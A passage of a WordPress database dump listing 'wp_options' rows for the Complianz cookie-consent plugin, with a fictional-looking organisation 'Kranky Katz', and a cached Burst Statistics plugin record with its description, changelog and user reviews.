(352, 'cmplz_tour_shown_once', '1', 'no'),
(359, 'cmplz_documents_update_date', '1666514318', 'no'),
(362, 'cmplz_cookie_data_verified_date', '1666514318', 'yes'),
(363, 'cmplz_changed_cookies', '-1', 'yes'),
(364, 'cmplz_publish_date', '1666514318', 'yes'),
(365, 'complianz_active_policy_id', '14', 'no'),
(366, 'complianz_options_wizard', 'a:33:{s:7:\"regions\";s:2:\"eu\";s:18:\"eu_consent_regions\";s:2:\"no\";s:9:\"us_states\";a:6:{s:3:\"cal\";s:1:\"0\";s:3:\"col\";s:1:\"0\";s:3:\"con\";s:1:\"0\";s:3:\"nev\";s:1:\"0\";s:3:\"uta\";s:1:\"0\";s:3:\"vir\";s:1:\"0\";}s:21:\"wp_admin_access_users\";s:3:\"yes\";s:16:\"cookie-statement\";s:9:\"generated\";s:17:\"privacy-statement\";s:4:\"none\";s:9:\"impressum\";s:4:\"none\";s:10:\"disclaimer\";s:4:\"none\";s:17:\"organisation_name\";s:11:\"Kranky Katz\";s:15:\"address_company\";s:26:\"7 Kangaroo Paw Drive, 6969\";s:15:\"country_company\";s:2:\"AU\";s:13:\"email_company\";s:20:\"admin@notreal.wac.tf\";s:17:\"telephone_company\";s:0:\"\";s:18:\"records_of_consent\";s:2:\"no\";s:11:\"datarequest\";s:2:\"no\";s:11:\"respect_dnt\";s:2:\"no\";s:18:\"compile_statistics\";s:2:\"no\";s:28:\"compile_statistics_more_info\";a:3:{s:8:\"accepted\";s:1:\"0\";s:10:\"no-sharing\";s:1:\"0\";s:20:\"ip-addresses-blocked\";s:1:\"0\";}s:40:\"compile_statistics_more_info_tag_manager\";a:3:{s:8:\"accepted\";s:1:\"0\";s:10:\"no-sharing\";s:1:\"0\";s:20:\"ip-addresses-blocked\";s:1:\"0\";}s:17:\"matomo_anonymized\";s:0:\"\";s:19:\"consent_per_service\";s:2:\"no\";s:24:\"uses_thirdparty_services\";s:3:\"yes\";s:27:\"thirdparty_services_on_site\";a:20:{s:14:\"activecampaign\";s:1:\"0\";s:12:\"google-fonts\";s:1:\"0\";s:16:\"google-recaptcha\";s:1:\"0\";s:11:\"google-maps\";s:1:\"0\";s:14:\"openstreetmaps\";s:1:\"0\";s:5:\"vimeo\";s:1:\"0\";s:7:\"youtube\";s:1:\"0\";s:10:\"videopress\";s:1:\"0\";s:11:\"dailymotion\";s:1:\"0\";s:10:\"soundcloud\";s:1:\"0\";s:6:\"twitch\";s:1:\"0\";s:6:\"paypal\";s:1:\"0\";s:7:\"spotify\";s:1:\"0\";s:6:\"hotjar\";s:1:\"0\";s:7:\"addthis\";s:1:\"0\";s:8:\"addtoany\";s:1:\"0\";s:9:\"sharethis\";s:1:\"0\";s:8:\"livechat\";s:1:\"0\";s:7:\"hubspot\";s:1:\"0\";s:8:\"calendly\";s:1:\"0\";}s:23:\"block_recaptcha_service\";s:2:\"no\";s:21:\"block_hubspot_service\";s:2:\"no\";s:17:\"uses_social_media\";s:2:\"no\";s:19:\"socialmedia_on_site\";a:8:{s:8:\"facebook\";s:1:\"0\";s:7:\"twitter\";s:1:\"0\";s:8:\"linkedin\";s:1:\"0\";s:8:\"whatsapp\";s:1:\"0\";s:9:\"instagram\";s:1:\"0\";s:6:\"tiktok\";s:1:\"0\";s:6:\"disqus\";s:1:\"0\";s:9:\"pinterest\";s:1:\"0\";}s:33:\"uses_firstparty_marketing_cookies\";s:2:\"no\";s:15:\"uses_ad_cookies\";s:2:\"no\";s:28:\"uses_ad_cookies_personalized\";s:2:\"no\";s:23:\"uses_wordpress_comments\";s:3:\"yes\";s:31:\"block_wordpress_comment_cookies\";s:2:\"no\";s:15:\"region_redirect\";s:2:\"no\";}', 'yes'),
(371, 'cmplz_detected_forms', 'a:0:{}', 'no'),
(372, 'cmplz_plugins_changed', '-1', 'yes');
INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(373, 'cmplz_plugins_updated', '-1', 'yes'),
(374, 'cmplz_cookie-statement_custom_page', '0', 'yes'),
(375, 'cmplz_cookie-statement_custom_page_url', '', 'yes'),
(376, 'cmplz_privacy-statement_custom_page', '0', 'yes'),
(377, 'cmplz_privacy-statement_custom_page_url', '', 'yes'),
(378, 'cmplz_impressum_custom_page', '0', 'yes'),
(379, 'cmplz_impressum_custom_page_url', '', 'yes'),
(380, 'cmplz_disclaimer_custom_page', '0', 'yes'),
(381, 'cmplz_disclaimer_custom_page_url', '', 'yes'),
(400, '_transient_timeout_cmplz_burst-statistics_plugin_info', '1667118801', 'no'),
(401, '_transient_cmplz_burst-statistics_plugin_info', 'O:8:\"stdClass\":25:{s:4:\"name\";s:65:\"Burst Statistics &#8211; Privacy-Friendly Analytics for WordPress\";s:4:\"slug\";s:16:\"burst-statistics\";s:7:\"version\";s:5:\"1.2.2\";s:6:\"author\";s:64:\"<a href=\"https://burst-statistics.com\">Really Simple Plugins</a>\";s:14:\"author_profile\";s:47:\"https://profiles.wordpress.org/rogierlankhorst/\";s:12:\"contributors\";a:4:{s:12:\"hesseldejong\";a:3:{s:7:\"profile\";s:44:\"https://profiles.wordpress.org/hesseldejong/\";s:6:\"avatar\";s:88:\"https://secure.gravatar.com/avatar/1d33ee9d5d4ec2a2a2db829a9246b079?s=96&d=monsterid&r=g\";s:12:\"display_name\";s:14:\"Hessel de Jong\";}s:15:\"rogierlankhorst\";a:3:{s:7:\"profile\";s:47:\"https://profiles.wordpress.org/rogierlankhorst/\";s:6:\"avatar\";s:88:\"https://secure.gravatar.com/avatar/e0c70ab988500880ace415f6a9c08cd9?s=96&d=monsterid&r=g\";s:12:\"display_name\";s:16:\"Rogier Lankhorst\";}s:10:\"aahulsebos\";a:3:{s:7:\"profile\";s:42:\"https://profiles.wordpress.org/aahulsebos/\";s:6:\"avatar\";s:88:\"https://secure.gravatar.com/avatar/40137de3be91c05efdeccd0e9dc1f445?s=96&d=monsterid&r=g\";s:12:\"display_name\";s:13:\"Aert Hulsebos\";}s:15:\"leonwimmenhoeve\";a:3:{s:7:\"profile\";s:47:\"https://profiles.wordpress.org/leonwimmenhoeve/\";s:6:\"avatar\";s:88:\"https://secure.gravatar.com/avatar/06afa9b5b8f396389dc81fe2bc151116?s=96&d=monsterid&r=g\";s:12:\"display_name\";s:16:\"Leon Wimmenhoeve\";}}s:8:\"requires\";s:3:\"5.4\";s:6:\"tested\";s:5:\"6.0.3\";s:12:\"requires_php\";s:3:\"7.2\";s:6:\"rating\";i:98;s:7:\"ratings\";a:5:{i:5;i:28;i:4;i:0;i:3;i:0;i:2;i:1;i:1;i:0;}s:11:\"num_ratings\";i:29;s:15:\"support_threads\";i:16;s:24:\"support_threads_resolved\";i:15;s:15:\"active_installs\";i:10000;s:12:\"last_updated\";s:22:\"2022-10-20 11:44am GMT\";s:5:\"added\";s:10:\"2022-02-04\";s:8:\"homepage\";s:50:\"https://www.wordpress.org/plugins/burst-statistics\";s:8:\"sections\";a:6:{s:11:\"description\";s:2529:\"<p>Get detailed insights into visitors&#8217; behaviour with Burst Statistics, the privacy-friendly analytics dashboard from Really Simple Plugins.</p>\n<h3>Features</h3>\n<ul>\n<li>Essential Metrics: Pageviews, Visitors, Sessions, Time on Page, Referrers etc</li>\n<li>Privacy-friendly: Locally hosted, and anonymized data in collaboration with Complianz</li>\n<li>Cookieless Tracking: Get data based on anonymous parameters without storing data in browsers.</li>\n<li>Optimized: Built for performance and data minimization.</li>\n<li>Flexibility: Have your own idea how Bounce Rate should be measured? Configure your own metrics.</li>\n<li>Open-Source: We see our users as collaborators, so please feel free to use the below links to help us out building the best analytics tool for WordPress</li>\n</ul>\n<h3>Useful Links</h3>\n<ul>\n<li><a href=\"https://burst-statistics.com/docs/\" rel=\"nofollow ugc\">Documentation</a></li>\n<li><a href=\"https://burst-statistics.com/definitions/\" rel=\"nofollow ugc\">Metric Definitions</a></li>\n<li><a href=\"https://translate.wordpress.org/projects/wp-plugins/burst-statistics/\" rel=\"nofollow ugc\">Translate Burst Statistics</a></li>\n<li><a href=\"https://github.com/Really-Simple-Plugins/burst/issues\" rel=\"nofollow ugc\">Issues &amp; pull requests</a></li>\n<li><a href=\"https://burst-statistics.com/feature-requests/how-to-add-a-feature-request/\" rel=\"nofollow ugc\">Feature requests</a></li>\n</ul>\n<h3>Need Support</h3>\n<p>Burst Statistics offers full support on the WordPress.org <a href=\"https://wordpress.org/support/plugin/burst-statistics/\">Forum</a>. Before starting a new thread, please check available documentation and other support threads. Leave a clear and concise description of your issue, and we will respond as soon as possible.</p>\n<h3>About Really Simple Plugins</h3>\n<p>Check out other plugins developed by Really Simple Plugins as well: <a href=\"https://wordpress.org/plugins/really-simple-ssl/\">Really Simple SSL</a> and <a href=\"https://wordpress.org/plugins/complianz-gdpr/\">Complianz</a></p>\n<p>We&#8217;re on <a href=\"https://github.com/Really-Simple-Plugins/burst\" rel=\"nofollow ugc\">GitHub</a> as well!</p>\n<p><a href=\"https://burst-statistics.com#contact\" rel=\"nofollow ugc\">Contact</a> us if you have any questions, issues, or suggestions. Burst Statistics is developed by <a href=\"https://burst-statistics.com\" rel=\"nofollow ugc\">Burst Statistics B.V.</a>. Leave your feature requests <a href=\"https://burst-statistics.com/feature-requests/\" rel=\"nofollow ugc\">here</a>.</p>\n\";s:12:\"installation\";s:256:\"<ul>\n<li>Go to “Plugins” in your WordPress Dashboard, and click “Add new”.</li>\n<li>Click “Upload”, and select the downloaded .zip file.</li>\n<li>Activate your new plugin.</li>\n<li>Use our tour to get familiar with Burst Statistics.</li>\n</ul>\n\";s:3:\"faq\";s:1935:\"\n<dt id=\'knowledgebase\'>\nKnowledgebase\n</h4>\n<p>\n<p>Burst will maintain and a grow a knowledgebase about Burst Statistics and other products to assist, while using Burst Statistics <a href=\"https://burst-statistics.com\" rel=\"nofollow ugc\">burst-statistics.com</a></p>\n</p>\n<dt id=\'can%20i%20block%20ip%20addresses%3F\'>\nCan I block IP Addresses?\n</h4>\n<p>\n<p>Before creating a dedicated user interface we collect proposed features as MU Plugins at <a href=\"https://github.com/Really-Simple-Plugins/burst-integrations\" rel=\"nofollow ugc\">Github &#8211; Burst Integrations</a></p>\n</p>\n<dt id=\'why%20is%20burst%20statistics%20privacy-friendly%3F\'>\nWhy is Burst Statistics Privacy-friendly?\n</h4>\n<p>\n<p>Burst Statistics provides an Analytics Dashboard with anonymized data that is yours, and yours alone.</p>\n</p>\n<dt id=\'what%20is%20cookieless%20tracking%3F\'>\nWhat is Cookieless tracking?\n</h4>\n<p>\n<p>Burst Statistics can be used without setting cookies or storing data in browsers. This, however, can affect accuracy; that&#8217;s why a hybrid option is possible with cookies after consent. Read more about <a href=\"https://burst-statistics.com/definition/what-is-cookieless-tracking/\" rel=\"nofollow ugc\">Cookieless tracking</a>.</p>\n</p>\n<dt id=\'does%20it%20affect%20performance%3F\'>\nDoes it affect performance?\n</h4>\n<p>\n<p>Burst Statistics uses an endpoint to minimize requests during sessions. For best performance you can always use our &#8216;Turbo Mode&#8217; which loads Burst in the footer, using the defer attribute.</p>\n</p>\n<dt id=\'do%20you%20mind%20if%20i%20give%20feedback%20about%20the%20product%3F\'>\nDo you mind if I give feedback about the product?\n</h4>\n<p>\n<p>We really want your feedback, please use the &#8220;Useful Links&#8221; section to get in contact. We&#8217;d like to develop this together.</p>\n</p>\n<dt id=\'is%20there%20a%20pro%20version%3F\'>\nIs there a Pro version?\n</h4>\n<p>\n<p>Not&#8230;yet.</p>\n</p>\n\n\";s:9:\"changelog\";s:2682:\"<h4>1.2.2</h4>\n<ul>\n<li>Fix: Fixed an issue where duplicating a WooCommerce product would copy the total pageviews from the original product.</li>\n</ul>\n<h4>1.2.1</h4>\n<ul>\n<li>Fix: Fixed an issue where adding role capabilities would result in a fatal error.</li>\n<li>Fix: Post and page counts did not update, this is fixed now.</li>\n<li>Fix: Changed endpoint DIR to URL to prevent 404 errors on subfolder installs.</li>\n<li>Improvement: Delete endpoint on uninstallation.</li>\n</ul>\n<h4>1.2.0</h4>\n<ul>\n<li>Feature: Introducing defer/footer as option</li>\n<li>Feature: Introducing new  improved tracking method</li>\n<li>Improvement: Feedback notices</li>\n</ul>\n<h4>1.1.5</h4>\n<ul>\n<li>Improvement: Changed from .less to .scss because WordPress also uses .scss</li>\n<li>Improvement: Update option autoload turned off on front end for better performance</li>\n<li>Fix: Fixed bug where UID could be empty resulting in an SQL error</li>\n<li>Fix: Fixed last step of shepherd tour to be inside the viewport</li>\n<li>Improvement: Integration with Complianz that adds burst_uid to the cookie-scanner</li>\n</ul>\n<h4>1.1.4</h4>\n<ul>\n<li>Fix: Bounce rate calculation</li>\n<li>Feature: Cookieless tracking</li>\n</ul>\n<h4>1.1.3</h4>\n<ul>\n<li>Fix: Fatal error on PHP 7.2</li>\n<li>Improvement: Block IP address with MU Plugin</li>\n<li>Improvement: Notice for REST API failure</li>\n</ul>\n<h4>1.1.2</h4>\n<ul>\n<li>Improvement: Added drop down to datatables, props @topfgartenwelt</li>\n</ul>\n<h4>1.1.1</h4>\n<ul>\n<li>Improvement: Added capabilities to view and/or edit burst</li>\n<li>Improvement: Added new devices to recognized devices</li>\n<li>Improvement: Added filters so that you can change the decimal and thousand separator</li>\n</ul>\n<h4>1.1.0</h4>\n<ul>\n<li>Fix: better tracking script. Hits from one pageview can not be registered multiple times now</li>\n<li>Improvement: visits in pages and posts overview. As these hits are stored differently,<br />\nthey will start at 0 for existing setups as well. Props: Shayne</li>\n<li>Improvement: added parameter to clear the dashboard cache</li>\n<li>Improvement: added JS event to so other plugins can integrate with Burst</li>\n<li>Improvement: added privacy annex</li>\n<li>Improvement: added widget to the WordPress Dashboard Props: Shayne</li>\n</ul>\n<h4>1.0.2</h4>\n<ul>\n<li>Fix: typo fix in generate_cached_data, props @seath</li>\n<li>Fix: some strings with wrong text domain </li>\n<li>Improvement: link in readme, props @8725z4twhugias</li>\n</ul>\n<h4>1.0.1</h4>\n<ul>\n<li>Fix: text domain, props @bonaldi</li>\n<li>Fix: parse_user_agent library prefix to fix compatibility with Rank Math</li>\n</ul>\n<h4>1.0.0</h4>\n<ul>\n<li>Initial release</li>\n</ul>\n\";s:11:\"screenshots\";s:271:\"<ol><li><a href=\"https://ps.w.org/burst-statistics/assets/screenshot-1.png?rev=2672964\"><img src=\"https://ps.w.org/burst-statistics/assets/screenshot-1.png?rev=2672964\" alt=\"Burst Statistics: Analytics Dashboard\"></a><p>Burst Statistics: Analytics Dashboard</p></li></ol>\";s:7:\"reviews\";s:13495:\"<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Great lightweight and easy analytics plugin</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/andreaswordpress/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/5b212f95c55d151d1891a00662fc3fa0?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/5b212f95c55d151d1891a00662fc3fa0?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/andreaswordpress/\" class=\"reviewer-name\">andreaswordpress</a> on <span class=\"review-date\">October 22, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Great lightweight and easy analytics plugin </div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Great lightweight and easy analytics plugin</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/louischan/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/12dbabb7218d2953bbcd07a535af6c50?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/12dbabb7218d2953bbcd07a535af6c50?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/louischan/\" class=\"reviewer-name\">louischan</a> on <span class=\"review-date\">October 16, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">I\'m glad I discovered this plugin, it\'s efficient, fast and offers nice analytics with a cookie free and anonymous mode to be RGPD compliant and be used without bothering the  visitors with a cookie banner.\nGreat tool for small/medium websites where you don\'t need super advanced analytics features !</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Funguje dobře</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/sosak8/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/451820b077b02bd6645f336b81083475?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/451820b077b02bd6645f336b81083475?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/sosak8/\" class=\"reviewer-name\">sosak8</a> on <span class=\"review-date\">October 3, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Používám ho asi měsíc a jsem s ním spokojený. \nVidím, kolik přístupů je na každou stránku během týdne i měsíce. Taky vidím, odkud se na moje stránky lidé dostávají.\nPlugin se mi líbí.</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">excelente plugin</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/karoline1204/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/72ead602b57c9e4b27b019bd22e42c85?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/72ead602b57c9e4b27b019bd22e42c85?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/karoline1204/\" class=\"reviewer-name\">karoline1204</a> on <span class=\"review-date\">September 27, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Es excelente su función, saber el tráfico de tu web es algo muy importante.</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">very good plugin working well!</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/eckweg/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/d04d4d02638c09d1574db15de27731fd?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/d04d4d02638c09d1574db15de27731fd?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/eckweg/\" class=\"reviewer-name\">eckweg</a> on <span class=\"review-date\">September 14, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">very good plugin working well!</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Fantastic</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/alsan2021/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/5fda13f776e6e6364f605c0fec7965b7?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/5fda13f776e6e6364f605c0fec7965b7?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/alsan2021/\" class=\"reviewer-name\">alsan2021</a> on <span class=\"review-date\">September 10, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Right on!  Exactly what we needed.</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">How refreshing!</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/smhsmh/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/6ff10ef007d911be3cd3078dfb77bdb5?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/6ff10ef007d911be3cd3078dfb77bdb5?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/smhsmh/\" class=\"reviewer-name\">smhsmh</a> on <span class=\"review-date\">August 29, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Super bloat free plugin, good clear presentation of statistics - privacy is important to them.</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Great plugin</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/8vasa8/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/436649d3780856effd2eaadc1332eb54?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/436649d3780856effd2eaadc1332eb54?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/8vasa8/\" class=\"reviewer-name\">8vasa8</a> on <span class=\"review-date\">August 26, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Love  it!</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Burst</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/idwebi/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/cd15a75e794252b91e5244279240f7fc?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/cd15a75e794252b91e5244279240f7fc?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/idwebi/\" class=\"reviewer-name\">idwebi</a> on <span class=\"review-date\">August 17, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Very nice tool!!!</div>\n</div>\n<div class=\"review\">\n	<div class=\"review-head\">\n		<div class=\"reviewer-info\">\n			<div class=\"review-title-section\">\n				<h4 class=\"review-title\">Very good</h4>\n				<div class=\"star-rating\">\n				<div class=\"wporg-ratings\" aria-label=\"5 out of 5 stars\" data-title-template=\"%s out of 5 stars\" data-rating=\"5\" style=\"color:#ffb900;\"><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span><span class=\"star dashicons dashicons-star-filled\"></span></div>				</div>\n			</div>\n			<p class=\"reviewer\">\n				By <a href=\"https://profiles.wordpress.org/lukad98/\"><img alt=\'\' src=\'https://secure.gravatar.com/avatar/13ffd8f675a1a9993a709fb3d1c807aa?s=16&#038;d=monsterid&#038;r=g\' srcset=\'https://secure.gravatar.com/avatar/13ffd8f675a1a9993a709fb3d1c807aa?s=32&#038;d=monsterid&#038;r=g 2x\' class=\'avatar avatar-16 photo\' height=\'16\' width=\'16\' loading=\'lazy\' decoding=\'async\'/></a><a href=\"https://profiles.wordpress.org/lukad98/\" class=\"reviewer-name\">lukesky <small>(lukad98)</small></a> on <span class=\"review-date\">July 3, 2022</span>			</p>\n		</div>\n	</div>\n	<div class=\"review-body\">Very good plugin, highly recommend.</div>\n</div>\n\";}s:13:\"download_link\";s:65:\"https://downloads.wordpress.org/plugin/burst-statistics.1.2.2.zip\";s:11:\"screenshots\";a:1:{i:1;a:2:{s:3:\"src\";s:69:\"https://ps.w.org/burst-statistics/assets/screenshot-1.png?rev=2672964\";s:7:\"caption\";s:37:\"Burst Statistics: Analytics Dashboard\";}}s:4:\"tags\";a:4:{s:9:\"analytics\";s:9:\"analytics\";s:21:\"analytics-alternative\";s:21:\"analytics alternative\";s:7:\"privacy\";s:7:\"privacy\";s:10:\"statistics\";s:10:\"statistics\";}s:8:\"versions\";a:5:{s:5:\"1.1.5\";s:65:\"https://downloads.wordpress.org/plugin/burst-statistics.1.1.5.zip\";s:5:\"1.2.0\";s:65:\"https://downloads.wordpress.org/plugin/burst-statistics.1.2.0.zip\";s:5:\"1.2.1\";s:65:\"https://downloads.wordpress.org/plugin/burst-statistics.1.2.1.zip\";s:5:\"1.2.2\";s:65:\"https://downloads.wordpress.org/plugin/burst-statistics.1.2.2.zip\";s:5:\"trunk\";s:59:\"https://downloads.wordpress.org/plugin/burst-statistics.zip\";}s:11:\"donate_link\";s:32:\"http://paypal.me/Burststatistics\";s:7:\"banners\";a:2:{s:3:\"low\";s:71:\"https://ps.w.org/burst-statistics/assets/banner-772x250.png?rev=2672964\";s:4:\"high\";s:72:\"https://ps.w.org/burst-statistics/assets/banner-1544x500.png?rev=2672964\";}}', 'no'),
(420, 'cmplz_last_cookie_sync', '1666514043', 'yes'),
(421, 'cmplz_sync_cookies_complete', '1', 'yes'),
